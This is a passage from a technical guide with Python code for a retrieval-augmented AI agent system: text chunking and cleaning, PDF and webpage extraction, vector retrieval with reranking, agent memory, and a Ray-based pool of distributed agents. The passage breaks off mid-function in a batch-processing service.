                chunk_hash = hashlib.md5(chunk.encode()).hexdigest()
                chunk_id = f"chunk_{chunk_hash}"
            
            # Create chunk metadata
            chunk_metadata = metadata.copy()
            chunk_metadata.update({
                "chunk_index": i,
                "chunk_count": len(chunks),
                "is_first_chunk": i == 0,
                "is_last_chunk": i == len(chunks) - 1,
                "text_length": len(chunk)
            })
            
            results.append((chunk, chunk_metadata, chunk_id))
        
        return results

class TextProcessor:
    """
    Processes text for better retrieval in vector databases.
    """
    
    def __init__(self,
                 chunker: TextChunker,
                 clean_html: bool = True,
                 normalize_whitespace: bool = True,
                 strip_markdown: bool = True):
        """
        Initialize the text processor.
        
        Args:
            chunker: TextChunker instance for splitting text
            clean_html: Whether to remove HTML tags
            normalize_whitespace: Whether to normalize whitespace
            strip_markdown: Whether to remove Markdown formatting
        """
        self.chunker = chunker
        self.clean_html = clean_html
        self.normalize_whitespace = normalize_whitespace
        self.strip_markdown = strip_markdown
    
    def process_document(self, text: str, metadata: Dict[str, Any]) -> List[Tuple[str, Dict[str, Any], str]]:
        """
        Process a document for storage in a vector database.
        
        Args:
            text: Document text
            metadata: Document metadata
            
        Returns:
            List of (processed_chunk, metadata, id) tuples
        """
        # Clean the text
        cleaned_text = self.clean_text(text)
        
        # Create a document ID based on content
        doc_hash = hashlib.md5(cleaned_text.encode()).hexdigest()
        document_id = metadata.get("id", f"doc_{doc_hash}")
        
        # Split into chunks with metadata
        return self.chunker.get_text_chunks_with_metadata(
            cleaned_text, metadata, document_id
        )
    
    def clean_text(self, text: str) -> str:
        """
        Clean text by removing unwanted formatting.
        
        Args:
            text: Text to clean
            
        Returns:
            Cleaned text
        """
        if not text:
            return ""
        
        # Remove HTML tags
        if self.clean_html:
            text = self._remove_html(text)
        
        # Remove Markdown formatting
        if self.strip_markdown:
            text = self._remove_markdown(text)
        
        # Normalize whitespace
        if self.normalize_whitespace:
            text = self._normalize_whitespace(text)
        
        return text
    
    def _remove_html(self, text: str) -> str:
        """
        Remove HTML tags from text.
        
        Args:
            text: Text containing HTML
            
        Returns:
            Text with HTML tags removed
        """
        # Simple regex-based HTML tag removal
        text = re.sub(r'<[^>]+>', ' ', text)
        
        # Replace HTML entities
        text = re.sub(r'&nbsp;', ' ', text)
        text = re.sub(r'&lt;', '<', text)
        text = re.sub(r'&gt;', '>', text)
        text = re.sub(r'&amp;', '&', text)
        text = re.sub(r'&quot;', '"', text)
        text = re.sub(r'&apos;', "'", text)
        
        return text
    
    def _remove_markdown(self, text: str) -> str:
        """
        Remove Markdown formatting from text.
        
        Args:
            text: Text containing Markdown
            
        Returns:
            Text with Markdown formatting removed
        """
        # Headers
        text = re.sub(r'^\s*#+\s+', '', text, flags=re.MULTILINE)
        
        # Bold, italic
        text = re.sub(r'\*\*(.*?)\*\*', r'\1', text)
        text = re.sub(r'\*(.*?)\*', r'\1', text)
        text = re.sub(r'__(.*?)__', r'\1', text)
        text = re.sub(r'_(.*?)_', r'\1', text)
        
        # Code blocks
        text = re.sub(r'```.*?\n(.*?)```', r'\1', text, flags=re.DOTALL)
        text = re.sub(r'`(.*?)`', r'\1', text)
        
        # Links
        text = re.sub(r'\[(.*?)\]\(.*?\)', r'\1', text)
        
        # Images
        text = re.sub(r'!\[(.*?)\]\(.*?\)', r'\1', text)
        
        # Lists
        text = re.sub(r'^\s*[\*\-+]\s+', '', text, flags=re.MULTILINE)
        text = re.sub(r'^\s*\d+\.\s+', '', text, flags=re.MULTILINE)
        
        # Blockquotes
        text = re.sub(r'^\s*>\s+', '', text, flags=re.MULTILINE)
        
        return text
    
    def _normalize_whitespace(self, text: str) -> str:
        """
        Normalize whitespace in text.
        
        Args:
            text: Text with irregular whitespace
            
        Returns:
            Text with normalized whitespace
        """
        # Replace multiple whitespace with a single space
        text = re.sub(r'\s+', ' ', text)
        
        # Fix line breaks: ensure paragraphs are separated by double newlines
        text = re.sub(r'\n{3,}', '\n\n', text)
        
        # Remove leading/trailing whitespace
        text = text.strip()
        
        return text

class PDFTextExtractor:
    """
    Extracts text from PDF documents for storage in a vector database.
    """
    
    def __init__(self, processor: TextProcessor, extract_images: bool = False):
        """
        Initialize the PDF text extractor.
        
        Args:
            processor: TextProcessor for processing extracted text
            extract_images: Whether to extract and process images
        """
        self.processor = processor
        self.extract_images = extract_images
    
    def process_pdf(self, 
                   pdf_path: str, 
                   metadata: Optional[Dict[str, Any]] = None) -> List[Tuple[str, Dict[str, Any], str]]:
        """
        Process a PDF file for storage in a vector database.
        
        Args:
            pdf_path: Path to PDF file
            metadata: Optional metadata to include
            
        Returns:
            List of (processed_chunk, metadata, id) tuples
        """
        try:
            import pypdf
            
            # Extract metadata from PDF
            pdf_metadata = self._extract_pdf_metadata(pdf_path)
            
            # Combine with provided metadata
            if metadata:
                combined_metadata = {**pdf_metadata, **metadata}
            else:
                combined_metadata = pdf_metadata
            
            # Extract text from PDF
            text = self._extract_text(pdf_path)
            
            # Process the extracted text
            return self.processor.process_document(text, combined_metadata)
            
        except ImportError:
            logger.error("PyPDF library not installed. Install with 'pip install pypdf'")
            raise
        except Exception as e:
            logger.error(f"Error processing PDF {pdf_path}: {e}")
            raise
    
    def _extract_pdf_metadata(self, pdf_path: str) -> Dict[str, Any]:
        """
        Extract metadata from a PDF file.
        
        Args:
            pdf_path: Path to PDF file
            
        Returns:
            Dictionary of metadata
        """
        import pypdf
        
        with open(pdf_path, 'rb') as f:
            pdf = pypdf.PdfReader(f)
            info = pdf.metadata
            
            # Extract basic metadata
            metadata = {
                "source": pdf_path,
                "file_type": "pdf",
                "page_count": len(pdf.pages)
            }
            
            # Add PDF metadata if available
            if info:
                if info.title:
                    metadata["title"] = info.title
                if info.author:
                    metadata["author"] = info.author
                if info.subject:
                    metadata["subject"] = info.subject
                if info.creator:
                    metadata["creator"] = info.creator
                if info.producer:
                    metadata["producer"] = info.producer
                if info.creation_date:
                    metadata["creation_date"] = str(info.creation_date)
            
            return metadata
    
    def _extract_text(self, pdf_path: str) -> str:
        """
        Extract text content from a PDF file.
        
        Args:
            pdf_path: Path to PDF file
            
        Returns:
            Extracted text
        """
        import pypdf
        
        with open(pdf_path, 'rb') as f:
            pdf = pypdf.PdfReader(f)
            text = ""
            
            # Extract text from each page
            for page_num, page in enumerate(pdf.pages):
                page_text = page.extract_text()
                if page_text:
                    text += f"Page {page_num + 1}:\n{page_text}\n\n"
            
            # Extract text from images if enabled
            if self.extract_images:
                image_text = self._extract_image_text(pdf_path)
                if image_text:
                    text += f"\nText from images:\n{image_text}\n"
            
            return text
    
    def _extract_image_text(self, pdf_path: str) -> str:
        """
        Extract text from images in a PDF file using OCR.
        
        Args:
            pdf_path: Path to PDF file
            
        Returns:
            Extracted text from images
        """
        # This would require OCR libraries like pytesseract
        # Implementation depends on specific requirements
        # Placeholder implementation
        return ""

class WebpageTextExtractor:
    """
    Extracts text from webpages for storage in a vector database.
    """
    
    def __init__(self, processor: TextProcessor):
        """
        Initialize the webpage text extractor.
        
        Args:
            processor: TextProcessor for processing extracted text
        """
        self.processor = processor
    
    def process_url(self, 
                   url: str, 
                   metadata: Optional[Dict[str, Any]] = None) -> List[Tuple[str, Dict[str, Any], str]]:
        """
        Process a webpage for storage in a vector database.
        
        Args:
            url: URL of webpage
            metadata: Optional metadata to include
            
        Returns:
            List of (processed_chunk, metadata, id) tuples
        """
        try:
            import requests
            from bs4 import BeautifulSoup
            
            # Fetch webpage
            response = requests.get(url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            })
            response.raise_for_status()
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract metadata
            webpage_metadata = self._extract_webpage_metadata(soup, url)
            
            # Combine with provided metadata
            if metadata:
                combined_metadata = {**webpage_metadata, **metadata}
            else:
                combined_metadata = webpage_metadata
            
            # Extract main content
            content = self._extract_main_content(soup)
            
            # Process the extracted content
            return self.processor.process_document(content, combined_metadata)
            
        except ImportError:
            logger.error("Required libraries not installed. Install with 'pip install requests beautifulsoup4'")
            raise
        except Exception as e:
            logger.error(f"Error processing URL {url}: {e}")
            raise
    
    def _extract_webpage_metadata(self, soup, url: str) -> Dict[str, Any]:
        """
        Extract metadata from a webpage.
        
        Args:
            soup: BeautifulSoup object
            url: URL of webpage
            
        Returns:
            Dictionary of metadata
        """
        metadata = {
            "source": url,
            "file_type": "webpage"
        }
        
        # Extract title
        title_tag = soup.find('title')
        if title_tag:
            metadata["title"] = title_tag.text.strip()
        
        # Extract description
        description_tag = soup.find('meta', attrs={'name': 'description'})
        if description_tag:
            metadata["description"] = description_tag.get('content', '')
        
        # Extract author
        author_tag = soup.find('meta', attrs={'name': 'author'})
        if author_tag:
            metadata["author"] = author_tag.get('content', '')
        
        # Extract publication date
        date_tag = soup.find('meta', attrs={'property': 'article:published_time'})
        if date_tag:
            metadata["publication_date"] = date_tag.get('content', '')
        
        # Extract keywords/tags
        keywords_tag = soup.find('meta', attrs={'name': 'keywords'})
        if keywords_tag:
            keywords = keywords_tag.get('content', '')
            if keywords:
                metadata["keywords"] = [k.strip() for k in keywords.split(',')]
        
        return metadata
    
    def _extract_main_content(self, soup) -> str:
        """
        Extract main content from a webpage.
        
        Args:
            soup: BeautifulSoup object
            
        Returns:
            Extracted text content
        """
        # Remove script and style elements
        for script in soup(["script", "style", "header", "footer", "nav"]):
            script.extract()
        
        # Try to find the main content
        main_content = None
        
        # Look for common content containers
        for selector in ['article', 'main', '[role="main"]', '.content', '#content', '.post', '.article']:
            content_tag = soup.select_one(selector)
            if content_tag:
                main_content = content_tag
                break
        
        # If no main content container found, use body
        if not main_content:
            main_content = soup.body
        
        # Extract text from content
        if main_content:
            # Get all paragraphs
            paragraphs = main_content.find_all('p')
            content = '\n\n'.join([p.get_text() for p in paragraphs])
            
            # If no paragraphs found, use all text
            if not content:
                content = main_content.get_text()
            
            return content
        
        # Fallback to all text
        return soup.get_text()
```

**4. Integration with AI Agent System**

```python
# vector_storage/integration.py
import os
import json
import logging
from typing import Dict, List, Any, Optional, Union, Tuple

from .knowledge_base import KnowledgeBase, Document
from .text_processing import TextProcessor, TextChunker

logger = logging.getLogger(__name__)

class VectorStoreRetriever:
    """
    Retriever for fetching relevant information from a knowledge base.
    """
    
    def __init__(self, 
                 knowledge_base: KnowledgeBase,
                 max_results: int = 5,
                 similarity_threshold: float = 0.7):
        """
        Initialize the retriever.
        
        Args:
            knowledge_base: Knowledge base to query
            max_results: Maximum number of results to return
            similarity_threshold: Minimum similarity threshold
        """
        self.knowledge_base = knowledge_base
        self.max_results = max_results
        self.similarity_threshold = similarity_threshold
    
    def retrieve(self, 
                query: str, 
                filter: Optional[Dict[str, Any]] = None,
                rerank: bool = False) -> List[Document]:
        """
        Retrieve relevant documents for a query.
        
        Args:
            query: Query string
            filter: Optional filter for metadata
            rerank: Whether to rerank results with cross-encoder
            
        Returns:
            List of relevant documents
        """
        # Search knowledge base
        documents = self.knowledge_base.search(
            query=query,
            top_k=self.max_results * 2 if rerank else self.max_results,  # Get more results if reranking
            threshold=self.similarity_threshold,
            filter=filter
        )
        
        if not documents:
            logger.info(f"No results found for query: {query}")
            return []
        
        # Rerank results if requested
        if rerank and len(documents) > 0:
            documents = self._rerank_results(query, documents)
        
        # Limit to max_results
        return documents[:self.max_results]
    
    def _rerank_results(self, query: str, documents: List[Document]) -> List[Document]:
        """
        Rerank results using a cross-encoder model.
        
        Args:
            query: Original query
            documents: Initial retrieval results
            
        Returns:
            Reranked documents
        """
        try:
            from sentence_transformers import CrossEncoder
            
            # Initialize cross-encoder
            model = CrossEncoder('cross-encoder/ms-marco-MiniLM-L-6-v2')
            
            # Prepare document pairs
            document_pairs = [(query, doc.content) for doc in documents]
            
            # Compute similarity scores
            similarity_scores = model.predict(document_pairs)
            
            # Update document scores
            for i, score in enumerate(similarity_scores):
                documents[i].score = float(score)
            
            # Sort by new scores
            documents.sort(key=lambda x: x.score, reverse=True)
            
            return documents
            
        except ImportError:
            logger.warning("sentence-transformers not installed. Install with 'pip install sentence-transformers'")
            return documents
        except Exception as e:
            logger.error(f"Error reranking results: {e}")
            return documents
    
    def retrieve_and_format(self, 
                          query: str, 
                          filter: Optional[Dict[str, Any]] = None,
                          max_tokens: int = 4000) -> str:
        """
        Retrieve and format documents as a string, ensuring it fits within token limits.
        
        Args:
            query: Query string
            filter: Optional filter for metadata
            max_tokens: Maximum tokens to return (approximate)
            
        Returns:
            Formatted context string
        """
        # Retrieve documents
        documents = self.retrieve(query, filter)
        
        if not documents:
            return "No relevant information found."
        
        # Format results
        formatted_text = "Relevant information:\n\n"
        
        char_count = len(formatted_text)
        # Rough approximation of tokens to characters (1 token ≈ 4 characters)
        max_chars = max_tokens * 4
        
        for i, doc in enumerate(documents):
            # Format document with score and metadata
            doc_text = f"[Document {i+1} - Score: {doc.score:.2f}]\n"
            
            # Add source info if available
            if "source" in doc.metadata:
                doc_text += f"Source: {doc.metadata.get('source', 'Unknown')}\n"
            
            # Add content
            doc_text += f"\n{doc.content}\n\n{'=' * 40}\n\n"
            
            # Check if adding this document would exceed the token limit
            if char_count + len(doc_text) > max_chars:
                # If this is the first document, add a truncated version
                if i == 0:
                    chars_remaining = max_chars - char_count
                    if chars_remaining > 100:  # Only add if we can include enough meaningful content
                        truncated_content = doc.content[:chars_remaining - 100] + "... [truncated]"
                        doc_text = f"[Document {i+1} - Score: {doc.score:.2f}]\n"
                        if "source" in doc.metadata:
                            doc_text += f"Source: {doc.metadata.get('source', 'Unknown')}\n"
                        doc_text += f"\n{truncated_content}\n\n"
                        formatted_text += doc_text
                break
            
            formatted_text += doc_text
            char_count += len(doc_text)
        
        return formatted_text

class AgentMemory:
    """
    Long-term memory for AI agents using vector storage.
    """
    
    def __init__(self, 
                 knowledge_base: KnowledgeBase,
                 text_processor: TextProcessor,
                 namespace: str = "agent_memory"):
        """
        Initialize agent memory.
        
        Args:
            knowledge_base: Knowledge base for storing memories
            text_processor: Text processor for processing memories
            namespace: Namespace for this agent's memories
        """
        self.knowledge_base = knowledge_base
        self.text_processor = text_processor
        self.namespace = namespace
    
    def add_interaction(self, 
                       user_input: str, 
                       agent_response: str,
                       metadata: Optional[Dict[str, Any]] = None) -> str:
        """
        Add a user-agent interaction to memory.
        
        Args:
            user_input: User input text
            agent_response: Agent response text
            metadata: Optional additional metadata
            
        Returns:
            Memory ID
        """
        # Create interaction text
        interaction_text = f"User: {user_input}\n\nAgent: {agent_response}"
        
        # Prepare metadata
        memory_metadata = {
            "type": "interaction",
            "timestamp": str(time.time()),
            "namespace": self.namespace
        }
        
        if metadata:
            memory_metadata.update(metadata)
        
        # Process the interaction for storage
        memory_id = f"memory_{str(uuid.uuid4())}"
        
        # Create a document
        document = Document(
            id=memory_id,
            content=interaction_text,
            metadata=memory_metadata
        )
        
        # Add to knowledge base
        self.knowledge_base.add_document(document)
        
        return memory_id
    
    def add_reflection(self, 
                      reflection: str,
                      metadata: Optional[Dict[str, Any]] = None) -> str:
        """
        Add an agent reflection to memory.
        
        Args:
            reflection: Reflection text
            metadata: Optional additional metadata
            
        Returns:
            Memory ID
        """
        # Prepare metadata
        memory_metadata = {
            "type": "reflection",
            "timestamp": str(time.time()),
            "namespace": self.namespace
        }
        
        if metadata:
            memory_metadata.update(metadata)
        
        # Process the reflection for storage
        memory_id = f"reflection_{str(uuid.uuid4())}"
        
        # Create a document
        document = Document(
            id=memory_id,
            content=reflection,
            metadata=memory_metadata
        )
        
        # Add to knowledge base
        self.knowledge_base.add_document(document)
        
        return memory_id
    
    def search_memory(self, 
                     query: str, 
                     memory_type: Optional[str] = None,
                     limit: int = 5) -> List[Dict[str, Any]]:
        """
        Search agent memory.
        
        Args:
            query: Search query
            memory_type: Optional memory type filter
            limit: Maximum number of results
            
        Returns:
            List of memory entries
        """
        # Create filter
        filter = {"namespace": self.namespace}
        
        if memory_type:
            filter["type"] = memory_type
        
        # Search knowledge base
        documents = self.knowledge_base.search(
            query=query,
            top_k=limit,
            filter=filter
        )
        
        # Format results
        results = []
        for doc in documents:
            results.append({
                "id": doc.id,
                "content": doc.content,
                "type": doc.metadata.get("type", "unknown"),
                "timestamp": doc.metadata.get("timestamp", ""),
                "relevance": doc.score
            })
        
        return results
    
    def get_relevant_memories(self, 
                            current_input: str, 
                            limit: int = 3) -> str:
        """
        Get relevant memories for the current user input.
        
        Args:
            current_input: Current user input
            limit: Maximum number of memories to retrieve
            
        Returns:
            Formatted string with relevant memories
        """
        # Search for relevant memories
        memories = self.search_memory(current_input, limit=limit)
        
        if not memories:
            return ""
        
        # Format memories
        formatted_memories = "Relevant past interactions:\n\n"
        
        for i, memory in enumerate(memories):
            memory_type = memory.get("type", "interaction").capitalize()
            timestamp = memory.get("timestamp", "")
            
            # Try to convert timestamp to human-readable format
            try:
                timestamp_float = float(timestamp)
                timestamp_str = datetime.datetime.fromtimestamp(timestamp_float).strftime("%Y-%m-%d %H:%M:%S")
            except (ValueError, TypeError):
                timestamp_str = timestamp
            
            formatted_memories += f"--- {memory_type} ({timestamp_str}) ---\n"
            formatted_memories += memory.get("content", "") + "\n\n"
        
        return formatted_memories

class RAGProcessor:
    """
    Retrieval-Augmented Generation (RAG) processor for AI agents.
    """
    
    def __init__(self, 
                 retriever: VectorStoreRetriever,
                 response_generator: Optional[callable] = None,
                 max_context_tokens: int = 4000):
        """
        Initialize the RAG processor.
        
        Args:
            retriever: Retriever for fetching relevant information
            response_generator: Optional function for generating responses
            max_context_tokens: Maximum tokens for context
        """
        self.retriever = retriever
        self.response_generator = response_generator
        self.max_context_tokens = max_context_tokens
    
    def generate_response(self, 
                         query: str, 
                         filter: Optional[Dict[str, Any]] = None,
                         additional_context: Optional[str] = None,
                         system_prompt: Optional[str] = None) -> Dict[str, Any]:
        """
        Generate a response using RAG.
        
        Args:
            query: User query
            filter: Optional filter for knowledge base
            additional_context: Optional additional context
            system_prompt: Optional system prompt
            
        Returns:
            Dictionary with response and metadata
        """
        # Retrieve relevant information
        retrieved_context = self.retriever.retrieve_and_format(
            query=query,
            filter=filter,
            max_tokens=self.max_context_tokens
        )
        
        # Combine with additional context if provided
        context = retrieved_context
        if additional_context:
            context = f"{additional_context}\n\n{context}"
        
        # Generate response
        if self.response_generator:
            # Use provided response generator
            response = self.response_generator(query, context, system_prompt)
        else:
            # Use default OpenAI-based generator
            response = self._default_response_generator(query, context, system_prompt)
        
        return {
            "response": response,
            "retrieved_context": retrieved_context,
            "query": query
        }
    
    def _default_response_generator(self, 
                                  query: str, 
                                  context: str,
                                  system_prompt: Optional[str] = None) -> str:
        """
        Generate a response using OpenAI.
        
        Args:
            query: User query
            context: Retrieved context
            system_prompt: Optional system prompt
            
        Returns:
            Generated response
        """
        import openai
        
        if not system_prompt:
            system_prompt = """You are a helpful AI assistant. Use the provided information to answer the user's question.
            If the information doesn't contain the answer, say you don't know."""
        
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": f"Information:\n{context}\n\nQuestion: {query}"}
        ]
        
        response = openai.ChatCompletion.create(
            model="gpt-4-turbo",
            messages=messages,
            temperature=0.5,
            max_tokens=1000
        )
        
        return response.choices[0].message.content
```

### Handling Large-Scale AI Workloads with Distributed Computing

Distributed computing is essential for scaling AI agent systems across multiple machines. Here are key implementation patterns:

**1. Ray Distributed Framework Integration**

```python
# distributed/ray_integration.py
import os
import json
import time
import logging
import ray
from typing import Dict, List, Any, Optional, Union, Tuple

logger = logging.getLogger(__name__)

# Initialize Ray (will use local Ray cluster if running, otherwise starts one)
if not ray.is_initialized():
    ray.init(address=os.environ.get("RAY_ADDRESS", None))

@ray.remote
class DistributedAgentActor:
    """Ray actor for running AI agents in a distributed manner."""
    
    def __init__(self, agent_config: Dict[str, Any]):
        """
        Initialize the agent actor.
        
        Args:
            agent_config: Configuration for the agent
        """
        self.agent_config = agent_config
        self.agent_type = agent_config.get("agent_type", "general")
        self.model = agent_config.get("model", "gpt-4-turbo")
        self.agent_id = f"{self.agent_type}_{time.time()}"
        
        # Agent state
        self.conversation_history = []
        self.metadata = {}
        self.is_initialized = False
        
        # Initialize the agent
        self._initialize_agent()
    
    def _initialize_agent(self):
        """Initialize the underlying agent."""
        try:
            import autogen
            
            # Configure the agent based on type
            system_message = self.agent_config.get("system_message", "You are a helpful assistant.")
            
            # Create Agent
            self.agent = autogen.AssistantAgent(
                name=self.agent_config.get("name", "Assistant"),
                system_message=system_message,
                llm_config={
                    "model": self.model,
                    "temperature": self.agent_config.get("temperature", 0.7),
                    "max_tokens": self.agent_config.get("max_tokens", 1000)
                }
            )
            
            # Create UserProxyAgent for handling conversations
            self.user_proxy = autogen.UserProxyAgent(
                name="User",
                human_input_mode="NEVER",
                max_consecutive_auto_reply=0,
                code_execution_config=False
            )
            
            self.is_initialized = True
            logger.info(f"Agent {self.agent_id} initialized successfully")
            
        except Exception as e:
            logger.error(f"Error initializing agent {self.agent_id}: {e}")
            self.is_initialized = False
    
    def generate_response(self, message: str, context: Optional[str] = None) -> Dict[str, Any]:
        """
        Generate a response to a message.
        
        Args:
            message: User message
            context: Optional context
            
        Returns:
            Response data
        """
        if not self.is_initialized:
            return {"error": "Agent not initialized properly"}
        
        try:
            # Prepare the full message with context if provided
            full_message = message
            if context:
                full_message = f"{context}\n\nUser message: {message}"
            
            # Reset the conversation
            self.user_proxy.reset()
            
            # Start the conversation
            start_time = time.time()
            self.user_proxy.initiate_chat(
                self.agent,
                message=full_message
            )
            
            # Extract the response
            response_content = None
            for msg in reversed(self.user_proxy.chat_history):
                if msg["role"] == "assistant":
                    response_content = msg["content"]
                    break
            
            if not response_content:
                raise ValueError("No response generated")
            
            # Calculate processing time
            processing_time = time.time() - start_time
            
            # Update conversation history
            self.conversation_history.append({
                "role": "user",
                "content": message,
                "timestamp": time.time()
            })
            
            self.conversation_history.append({
                "role": "assistant",
                "content": response_content,
                "timestamp": time.time()
            })
            
            # Prepare response data
            response_data = {
                "response": response_content,
                "agent_id": self.agent_id,
                "agent_type": self.agent_type,
                "model": self.model,
                "processing_time": processing_time
            }
            
            return response_data
            
        except Exception as e:
            logger.error(f"Error generating response: {e}")
            return {"error": str(e), "agent_id": self.agent_id}
    
    def get_conversation_history(self) -> List[Dict[str, Any]]:
        """
        Get the conversation history.
        
        Returns:
            List of conversation messages
        """
        return self.conversation_history
    
    def set_metadata(self, key: str, value: Any) -> None:
        """
        Set metadata for the agent.
        
        Args:
            key: Metadata key
            value: Metadata value
        """
        self.metadata[key] = value
    
    def get_metadata(self, key: Optional[str] = None) -> Any:
        """
        Get agent metadata.
        
        Args:
            key: Optional specific metadata key
            
        Returns:
            Metadata value or all metadata
        """
        if key:
            return self.metadata.get(key)
        return self.metadata

@ray.remote
class AgentPoolManager:
    """Manages a pool of agent actors for efficient resource utilization."""
    
    def __init__(self, 
                 agent_configs: Dict[str, Dict[str, Any]],
                 max_agents_per_type: int = 5,
                 idle_timeout_seconds: int = 300):
        """
        Initialize the agent pool manager.
        
        Args:
            agent_configs: Dictionary mapping agent types to configurations
            max_agents_per_type: Maximum number of agents per type
            idle_timeout_seconds: Seconds of inactivity before removing an agent
        """
        self.agent_configs = agent_configs
        self.max_agents_per_type = max_agents_per_type
        self.idle_timeout_seconds = idle_timeout_seconds
        
        # Initialize pools
        self.agent_pools = {}
        self.busy_agents = {}
        self.last_used = {}
        
        # Create initial agents
        self._initialize_pools()
        
        # Start maintenance task
        self._start_maintenance()
    
    def _initialize_pools(self):
        """Initialize agent pools with minimal agents."""
        for agent_type, config in self.agent_configs.items():
            self.agent_pools[agent_type] = []
            self.busy_agents[agent_type] = {}
            
            # Create one initial agent per type
            agent_ref = DistributedAgentActor.remote(config)
            self.agent_pools[agent_type].append(agent_ref)
            self.last_used[agent_ref] = time.time()
    
    def _start_maintenance(self):
        """Start the maintenance task to manage pool size."""
        import threading
        
        def maintenance_task():
            while True:
                try:
                    self._cleanup_idle_agents()
                except Exception as e:
                    logger.error(f"Error in maintenance task: {e}")
                
                time.sleep(60)  # Run maintenance every minute
        
        # Start maintenance thread
        maintenance_thread = threading.Thread(target=maintenance_task, daemon=True)
        maintenance_thread.start()
    
    def _cleanup_idle_agents(self):
        """Remove idle agents to free resources."""
        current_time = time.time()
        
        for agent_type, pool in self.agent_pools.items():
            # Keep at least one agent per type
            if len(pool) <= 1:
                continue
            
            # Check each agent in the pool
            for agent_ref in list(pool):  # Copy list as we might modify it
                # Skip if agent is not in last_used (shouldn't happen)
                if agent_ref not in self.last_used:
                    continue
                
                # Check if agent has been idle for too long
                idle_time = current_time - self.last_used[agent_ref]
                if idle_time > self.idle_timeout_seconds:
                    # Remove from pool
                    pool.remove(agent_ref)
                    del self.last_used[agent_ref]
                    
                    # Kill the actor
                    ray.kill(agent_ref)
                    
                    logger.info(f"Removed idle agent of type {agent_type} after {idle_time:.1f}s")
    
    async def get_agent(self, agent_type: str) -> ray.ObjectRef:
        """
        Get an agent from the pool.
        
        Args:
            agent_type: Type of agent to get
            
        Returns:
            Ray object reference to the agent
            
        Raises:
            ValueError: If agent type is not configured
        """
        if agent_type not in self.agent_configs:
            raise ValueError(f"Agent type {agent_type} not configured")
        
        # Check if agent available in pool
        if not self.agent_pools[agent_type]:
            # No agents available, create a new one if under limit
            if len(self.busy_agents[agent_type]) < self.max_agents_per_type:
                agent_ref = DistributedAgentActor.remote(self.agent_configs[agent_type])
                self.busy_agents[agent_type][agent_ref] = time.time()
                self.last_used[agent_ref] = time.time()
                return agent_ref
            else:
                # Wait for an agent to become available
                # Find least recently used busy agent
                least_recent_agent, _ = min(
                    self.busy_agents[agent_type].items(),
                    key=lambda x: x[1]
                )
                return least_recent_agent
        
        # Get agent from pool
        agent_ref = self.agent_pools[agent_type].pop(0)
        self.busy_agents[agent_type][agent_ref] = time.time()
        self.last_used[agent_ref] = time.time()
        
        return agent_ref
    
    def release_agent(self, agent_ref: ray.ObjectRef, agent_type: str):
        """
        Release an agent back to the pool.
        
        Args:
            agent_ref: Ray object reference to the agent
            agent_type: Type of agent
        """
        if agent_type not in self.agent_configs:
            logger.warning(f"Unknown agent type {agent_type} in release_agent")
            return
        
        # Remove from busy agents
        if agent_ref in self.busy_agents[agent_type]:
            del self.busy_agents[agent_type][agent_ref]
        
        # Update last used time
        self.last_used[agent_ref] = time.time()
        
        # Add back to pool
        self.agent_pools[agent_type].append(agent_ref)
    
    def get_pool_status(self) -> Dict[str, Any]:
        """
        Get the status of all agent pools.
        
        Returns:
            Dictionary with pool status
        """
        status = {}
        
        for agent_type in self.agent_configs:
            available = len(self.agent_pools.get(agent_type, []))
            busy = len(self.busy_agents.get(agent_type, {}))
            
            status[agent_type] = {
                "available": available,
                "busy": busy,
                "total": available + busy,
                "max": self.max_agents_per_type
            }
        
        return status

class RayAgentManager:
    """High-level manager for distributed AI agents using Ray."""
    
    def __init__(self, agent_configs_path: str):
        """
        Initialize the Ray agent manager.
        
        Args:
            agent_configs_path: Path to agent configurations JSON file
        """
        # Load agent configurations
        with open(agent_configs_path, 'r') as f:
            self.agent_configs = json.load(f)
        
        # Create agent pool manager
        self.pool_manager = AgentPoolManager.remote(
            agent_configs=self.agent_configs,
            max_agents_per_type=10,
            idle_timeout_seconds=300
        )
    
    async def process_request(self, 
                            agent_type: str, 
                            message: str,
                            context: Optional[str] = None) -> Dict[str, Any]:
        """
        Process a request using a distributed agent.
        
        Args:
            agent_type: Type of agent to use
            message: User message
            context: Optional context
            
        Returns:
            Response data
        """
        try:
            # Get an agent from the pool
            agent_ref = await self.pool_manager.get_agent.remote(agent_type)
            
            # Process the request
            response = await agent_ref.generate_response.remote(message, context)
            
            # Release the agent back to the pool
            await self.pool_manager.release_agent.remote(agent_ref, agent_type)
            
            return response
            
        except Exception as e:
            logger.error(f"Error processing request: {e}")
            return {"error": str(e)}
    
    async def get_pool_status(self) -> Dict[str, Any]:
        """
        Get the status of all agent pools.
        
        Returns:
            Dictionary with pool status
        """
        return await self.pool_manager.get_pool_status.remote()

@ray.remote
class BatchProcessingService:
    """Service for batch processing with AI agents."""
    
    def __init__(self, agent_manager_ref: ray.ObjectRef):
        """
        Initialize the batch processing service.
        
        Args:
            agent_manager_ref: Ray object reference to agent pool manager
        """
        self.agent_manager = agent_manager_ref
        self.running_jobs = {}
    
    async def submit_batch_job(self, 
                             items: List[Dict[str, Any]],
                             agent_type: str,
                             max_concurrency: int = 5) -> str:
        """
        Submit a batch job for processing.
        
        Args:
            items: List of items to process
            agent_type: Type of agent to use
            max_concurrency: Maximum concurrent processing
            
        Returns:
            Job ID
        """
        # Generate a job ID
        job_id = f"job_{time.time()}_{len(self.running_jobs)}"
        
        # Start processing in the background
        self.running_jobs[job_id] = {
            "status": "running",
            "total_items": len(items),
            "completed_items": 0,
            "results": {},
            "errors": {},
            "start_time": time.time()
        }
        
        # Process items in batches asynchronously
        import asyncio
        asyncio.create_task(self._process_batch(job_id, items, agent_type, max_concurrency))
        
        return job_id
    
    async def _process_batch(self, 
                            job_id: str, 
                            items: List[Dict[str, Any]],
                            agent_type: str,
                            max_concurrency: int):
        """
        Process a batch of items.
        
        Args:
            job_id: Job ID
            items: List of items to process
            agent_type: Type of agent to use
            max_concurrency: Maximum concurrent processing
        """
        import asyncio
        
        # Process in batches to control concurrency
        for i in range(0, len(items), max_concurrency):
            batch = items[i:i + max_concurrency]
            
            # Process batch concurrently
            tasks = []
            for item in batch:
                item_id = item.get("id", f"item_{i}")
                message = item.get("message", "")
                context = item.get("context")
                
                task = self._process_item(item_id, message, context, agent_type)
                tasks.append(task)
            
            # Wait for all tasks in this batch to complete
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Update job status
